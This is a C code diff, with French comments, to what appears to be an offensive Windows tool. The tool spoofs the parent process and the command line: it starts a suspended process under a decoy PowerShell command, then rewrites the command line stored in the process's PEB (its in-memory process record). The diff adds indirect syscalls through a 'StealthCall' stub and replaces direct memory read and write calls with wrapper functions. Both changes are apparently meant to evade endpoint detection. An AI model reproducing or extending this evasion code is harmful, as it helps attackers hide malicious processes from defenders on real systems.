@@ -115,7 +115,7 @@ int get_process(LPCSTR lpName, PHANDLE hProc, PDWORD PID){
         if (strcmpi(pe32.szExeFile, lpName) == 0) {
             printf("[+] Found ! PID: %u - %s\n", pe32.th32ProcessID, pe32.szExeFile);
             *PID = pe32.th32ProcessID;
-            *hProc = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, *PID);
+            *hProc = WrapperOpenProcess(*PID);
             break;
         }
     } while (Process32Next(snapshot, &pe32));
@@ -207,7 +207,7 @@ BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppR
     if (*ppReadBuffer == NULL) return FALSE;
 
     SIZE_T sNmbrOfBytesRead = 0;
-    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead)) {
+    if (!WrapperReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead)) {
         printf("[!] ReadProcessMemory Failed : %u\n", GetLastError());
         HeapFree(hHeap, 0, *ppReadBuffer);
         *ppReadBuffer = NULL;
@@ -220,7 +220,7 @@ BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVO
 
     SIZE_T sNmbrOfBytesWritten  = 0;
 
-    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
+    if (!WrapperWriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
         printf("[!] WriteProcessMemory Failed With Error : %u \n", GetLastError());
         printf("[i] Bytes Written : %llu Of %llu \n", (unsigned long long)sNmbrOfBytesWritten, (unsigned long long)dwBufferSize);
         return FALSE;
@@ -264,21 +264,39 @@ BOOL CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPC
     
     // Buffer large pour éviter les débordements
     WCHAR fakeStartupArgs[1024] = L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\"";
-    
-    if (!CreateProcessW(NULL, fakeStartupArgs, NULL, NULL, FALSE, 
-        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, 
-        NULL, NULL, &SiEx.StartupInfo, Pi)) {
+    size_t currentLen = lstrlenW(fakeStartupArgs);
+    for (size_t i = currentLen; i < 1023; i++) {
+        fakeStartupArgs[i] = L' '; // 0x0020
+    }
+    fakeStartupArgs[1023] = L'\0';
+
+    if (!CreateProcessW(NULL, fakeStartupArgs, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SiEx.StartupInfo, Pi)) {
         printf("[!] CreateProcessW Failed: %d\n", GetLastError());
         HeapFree(hHeap, 0, pThreadAttList);
         return FALSE;
     }
 
     // Résolution NtQuery
-    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
-    
+    //_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
+    DWORD dwNtQuerySSN = 0;
+    PVOID pNtQuerySyscallPtr = NULL;
+    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess", &dwNtQuerySSN, &pNtQuerySyscallPtr);
+
     PROCESS_BASIC_INFORMATION PBI = { 0 };
     ULONG ret = 0;
-    pNtQueryInformationProcess(Pi->hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &ret);
+    //pNtQueryInformationProcess(Pi->hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &ret);
+    ULONG ntStatus = StealthCall(dwNtQuerySSN, pNtQuerySyscallPtr, 5, 
+        (UINT64)Pi->hProcess, 
+        (UINT64)0, // ProcessBasicInformation (0)
+        (UINT64)&PBI, 
+        (UINT64)sizeof(PROCESS_BASIC_INFORMATION), 
+        (UINT64)&ret
+    );
+
+    if (ntStatus != 0) {
+        printf("[!] NtQueryInformationProcess Failed with NTSTATUS: 0x%X\n", ntStatus);
+        goto cleanup;
+    }
 
     PPEB pPeb = NULL;
     PRTL_USER_PROCESS_PARAMETERS pParms = NULL;
@@ -286,7 +304,7 @@ BOOL CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPC
     if (!ReadFromTargetProcess(Pi->hProcess, PBI.PebBaseAddress, (PVOID*)&pPeb, sizeof(PEB))) goto cleanup;
 
     // Lecture des paramètres distants
-    if (!ReadFromTargetProcess(Pi->hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0x100)) goto cleanup;
+    if (!ReadFromTargetProcess(Pi->hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, sizeof(RTL_USER_PROCESS_PARAMETERS))) goto cleanup;
     
     SIZE_T effectiveArgs_bsz = (lstrlenW(procCmdLine) + 1) * sizeof(WCHAR); 
     
